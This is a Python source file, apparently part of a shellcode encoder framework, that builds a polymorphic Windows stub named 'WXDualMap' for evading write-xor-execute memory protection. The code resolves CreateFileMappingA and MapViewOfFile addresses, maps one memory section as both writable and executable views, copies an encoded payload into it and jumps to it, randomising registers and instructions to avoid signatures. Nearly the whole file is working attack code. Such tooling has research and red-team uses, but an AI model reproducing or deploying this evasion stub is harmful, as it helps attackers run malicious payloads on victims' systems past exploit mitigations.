#!/usr/bin/python

"""
WXDualMap
DualMapping WX-evasion shellcode
"""

from random import choice
from struct import unpack
from assembler.assembler import assembler
from evasion_modules.core.core import evasion_module
from evasion_modules.core.getpc import getpc_stub_builder
from arch.core import stackpointer_registers, word_keywords, arch_registers, acc_regs, ctr_regs, src_index_regs, dest_index_regs, bit_packs
from arch.winapi import winapi_db, filemap_read_write, filemap_read_write_execute, page_exec_read_write_commit
from utils.bytework import bytes_to_asm

class evasion_wx_dualmap(evasion_module):

	def getpc_stub(self, getpc_reg):
		reg_size = 2**self.bits

		stackpointer_reg = stackpointer_registers[self.bits]

		acc_reg = acc_regs[self.bits]
		ctr_reg = ctr_regs[self.bits]
		src_index_reg = src_index_regs[self.bits]
		dest_index_reg = dest_index_regs[self.bits]

		payload_size = len(self.encoded_payload) + len(self.keyfiller_stub) + len(self.decoder_stub)

		null_instructions = ['XOR', 'SUB']
		null_instr = choice(null_instructions)

		stub_builder = getpc_stub_builder(self.arch, self.bits, self.badchars)
		esi_getpc_stub = unpack(bit_packs[self.bits], stub_builder.stack_getpc_stub(src_index_reg))[0]

		apidb = winapi_db(self.additional_params['os_version'], self.additional_params['service_pack'], self.additional_params['language_pack'])
		apidb.connect(self.additional_params['db_filename'])

		CreateFileMappingA = apidb.get_function_address("CreateFileMappingA", "kernel32.dll")		
		MapViewOfFile = apidb.get_function_address("MapViewOfFile", "kernel32.dll")

		regs = arch_registers(self.arch, self.bits)
		reg1 = regs.random_gp_reg(False, [acc_reg])
		reg2 = regs.random_gp_reg(False, [acc_reg, reg1])

		reg3 = regs.random_gp_reg(False, [acc_reg])
		reg4 = regs.random_gp_reg(False, [acc_reg, reg3])

		reg5 = regs.random_gp_reg(False, [acc_reg])
		reg6 = regs.random_gp_reg(False, [acc_reg, reg5])

  		variables = {'getpc_reg': getpc_reg, 'esi_getpc_stub': esi_getpc_stub, 'stackpointer_reg': stackpointer_reg, 'acc_reg': acc_reg, 'ctr_reg': ctr_reg, 'src_index_reg': src_index_reg, 'dest_index_reg': dest_index_reg, 'CreateFileMappingA': CreateFileMappingA, 'MapViewOfFile': MapViewOfFile, 'null_instr': null_instr, 'payload_size': payload_size, 'reg_size': reg_size, 'page_exec_read_write_commit': page_exec_read_write_commit, 'filemap_read_write_execute': filemap_read_write_execute, 'filemap_read_write': filemap_read_write, 'reg1': reg1, 'reg2': reg2, 'reg3': reg3, 'reg4': reg4, 'reg5': reg5, 'reg6': reg6}

  		listing_0 = '''
main:
	; REP MOVSB
	.byte 0xF3
	.byte 0xA4

	MOV {getpc_reg}, {acc_reg}
	JMP {getpc_reg}'''

		asm = assembler(self.arch, self.bits)
		final_stub = asm.assemble(listing_0.format(**variables))

		variables['final_stub'] = bytes_to_asm(final_stub)
		variables['pc_adjustment'] = len(final_stub)+3

		listing_1 = '''
main:
	{null_instr} {reg1}, {reg1}
	
	{null_instr} {reg2}, {reg2}
	SUB {reg2}, (-{payload_size} % {reg_size})

	PUSH {reg1}
	PUSH {reg2}
	PUSH {reg1}

	{null_instr} {reg2}, {reg2}
	SUB {reg2}, (-{page_exec_read_write_commit} % {reg_size})
	PUSH {reg2}
	PUSH {reg1}
	PUSH (-1 % {reg_size})
	MOV {reg2}, {CreateFileMappingA}
	CALL {reg2}

	PUSH {acc_reg}

	{null_instr} {reg3}, {reg3}
	PUSH {reg3}
	PUSH {reg3}
	PUSH {reg3}
	PUSH {filemap_read_write}
	PUSH {acc_reg}
	MOV {reg4}, {MapViewOfFile}
	CALL {reg4}

	POP {reg6}

	PUSH {acc_reg}

	{null_instr} {reg5}, {reg5}
	PUSH {reg5}
	PUSH {reg5}
	PUSH {reg5}
	PUSH {filemap_read_write_execute}
	PUSH {reg6}
	MOV {reg6}, {MapViewOfFile}
	CALL {reg6}

	POP {dest_index_reg}

	{null_instr} {ctr_reg}, {ctr_reg}
	SUB {ctr_reg}, (-{payload_size} % {reg_size})
	
	; PC to ESI
	PUSH {esi_getpc_stub}
	CALL {stackpointer_reg}
	SUB {src_index_reg}, (-{pc_adjustment} % {reg_size})

	{final_stub}
'''

		asm = assembler(self.arch, self.bits)
		stub = asm.assemble(listing_1.format(**variables))
		return stub